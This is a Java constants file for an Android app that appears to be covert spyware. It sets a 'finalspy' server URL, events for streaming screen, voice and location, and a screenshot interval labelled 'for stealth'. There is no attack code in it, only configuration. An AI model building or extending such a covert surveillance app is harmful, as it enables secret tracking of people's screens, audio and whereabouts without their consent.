package com.example.myapplication.utils;

public class Constants {
    // IMPORTANT: Replace with your Render server URL after deployment
    // For local testing use: "http://10.0.2.2:3000" (for emulator) or your local IP like "http://192.168.1.100:3000"
    // For production use your Render URL: "https://your-render-app.onrender.com"
    public static final String SERVER_URL = "https://finalspy.onrender.com";
    
    // Socket.IO events
    public static final String EVENT_SHARE_SCREEN = "share-screen";
    public static final String EVENT_SHARE_VOICE = "share-voice";
    public static final String EVENT_SHARE_LOCATION = "share-location";
    
    // Permission request codes
    public static final int REQUEST_CODE_PERMISSIONS = 1001;
    public static final int REQUEST_CODE_SCREEN_CAPTURE = 1002;
    
    // Screen sharing quality
    public static final int SCREEN_CAPTURE_WIDTH = 720;  // 720p width
    public static final int SCREEN_CAPTURE_HEIGHT = 1280;  // 720p height
    public static final int SCREEN_CAPTURE_BITRATE = 1500000;  // 1.5 Mbps
    
    // Location update interval (in milliseconds)
    public static final long LOCATION_UPDATE_INTERVAL = 10000;  // 10 seconds
    
    // Screenshot capture interval (in milliseconds)
    public static final long SCREENSHOT_INTERVAL = 5000;  // 5 seconds for stealth
}
